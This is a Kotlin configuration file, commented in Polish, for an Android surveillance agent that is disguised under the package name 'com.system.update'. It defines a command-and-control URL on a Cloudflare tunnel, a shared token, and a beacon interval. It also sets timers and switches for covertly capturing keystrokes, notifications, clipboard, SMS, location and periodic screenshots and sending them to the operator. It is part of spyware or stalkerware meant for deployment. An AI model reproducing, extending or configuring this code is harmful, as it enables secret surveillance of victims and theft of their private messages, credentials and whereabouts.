package com.system.update

object Config {
    // ═══════════════════════════════════════════════
    //  ZMIEŃ NA SWÓJ C2 URL (z cloudflared)
    // ═══════════════════════════════════════════════
    const val C2_URL = "https://night-assignment-matrix-dna.trycloudflare.com"
    const val SECRET_TOKEN = "night-assignment-matrix-dna"

    // co ile sekund agent pinguje C2
    const val BEACON_INTERVAL_SEC = 30L

    // co ile sekund wysyłać bufor klawiszy
    const val KEYLOG_FLUSH_SEC = 60L

    // co ile minut robić screenshot
    const val SCREENSHOT_INTERVAL_SEC = 300L

    // co ile minut sprawdzać lokalizację
    const val LOCATION_INTERVAL_SEC = 300L

    // co ile minut wysyłać info o baterii/wifi
    const val STATUS_INTERVAL_SEC = 600L

    // czy zbieramy wszystko
    const val LOG_KEYS = true
    const val LOG_NOTIFICATIONS = true
    const val LOG_BROWSER = false     // trudne na Androidzie
    const val LOG_CLIPBOARD = true
    const val LOG_SMS = true
    const val LOG_LOCATION = true
    const val LOG_SCREENSHOTS = true
    const val LOG_CAMERA = false      // wymaga foreground
}
